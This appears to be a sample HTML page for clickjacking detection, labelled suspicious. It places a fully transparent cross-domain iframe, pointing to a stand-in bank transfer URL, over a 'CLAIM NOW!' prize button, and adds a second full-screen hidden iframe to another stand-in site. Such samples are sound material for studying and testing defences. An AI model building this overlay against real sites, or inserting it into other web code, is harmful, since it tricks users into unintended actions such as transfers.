<!DOCTYPE html>
<html>
<head>
    <title>Suspicious Page - Transparent Cross-Domain Iframe</title>
    <style>
        .overlay-frame {
            position: absolute;
            top: 100px;
            left: 200px;
            width: 300px;
            height: 200px;
            opacity: 0;
            z-index: 9999;
        }
        .hidden-frame {
            filter: alpha(opacity=0);
            position: fixed;
            top: 0;
            left: 0;
        }
    </style>
</head>
<body>
    <h1>Win a Prize!</h1>

    <p>Click the button below to claim your free gift!</p>

    <!-- Visible decoy button positioned under the transparent iframe -->
    <div style="position: absolute; top: 120px; left: 220px;">
        <button id="claim-btn" style="width: 200px; height: 50px; font-size: 24px;">
            CLAIM NOW!
        </button>
    </div>

    <!-- Malicious transparent cross-domain iframe overlaying the button -->
    <iframe
        class="overlay-frame"
        src="https://malicious-bank.com/transfer?amount=1000"
        frameborder="0"
        scrolling="no">
    </iframe>

    <!-- Another hidden iframe using IE filter -->
    <iframe
        class="hidden-frame"
        src="https://another-evil-site.com/clickjack"
        width="100%"
        height="100%"
        style="filter: alpha(opacity=0);">
    </iframe>

    <footer>
        <a href="/terms">Terms</a>
    </footer>
</body>
</html>
